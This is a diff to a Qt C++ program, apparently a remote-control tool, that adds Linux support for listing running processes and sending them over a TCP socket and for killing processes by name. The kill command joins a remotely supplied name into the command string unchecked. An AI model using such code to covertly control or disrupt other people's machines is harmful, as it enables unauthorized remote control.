@@ -723,10 +723,10 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
 }
 void MainWindow::listarProcesos()
 {
-    #ifdef Q_OS_WIN
     int i;
     QProcess procesos;
     QString listaEnvio = "listaprocesos|@|";
+    #ifdef Q_OS_WIN
     procesos.start("tasklist");
     procesos.waitForFinished();
     procesos.waitForReadyRead();
@@ -736,15 +736,27 @@ void MainWindow::listarProcesos()
     {
         listaEnvio = listaEnvio + listaProc[i].split(" ")[0] + "|@|";
     }
-    util.escribirSocket(listaEnvio,&socket);
+    #else
+    procesos.start("ps  -eo %c");
+    procesos.waitForFinished();
+    procesos.waitForReadyRead();
+    QString salida = procesos.readAllStandardOutput();
+    QStringList listaProc = salida.split("\n");
+    for(i=1;i<listaProc.size();i++)
+    {
+        listaEnvio = listaEnvio + listaProc[i] + "|@|";
+    }
     #endif
+    util.escribirSocket(listaEnvio,&socket);
 }
 void MainWindow::matarProceso(QString programa)
 {
     #ifdef Q_OS_WIN
     QString orden = "taskkill /IM " + programa;
-    QProcess::startDetached(orden);
+    #else
+    QString orden = "killall " + programa;
     #endif
+    QProcess::startDetached(orden);
 }
 void paralelo::datosEscritos()
 {
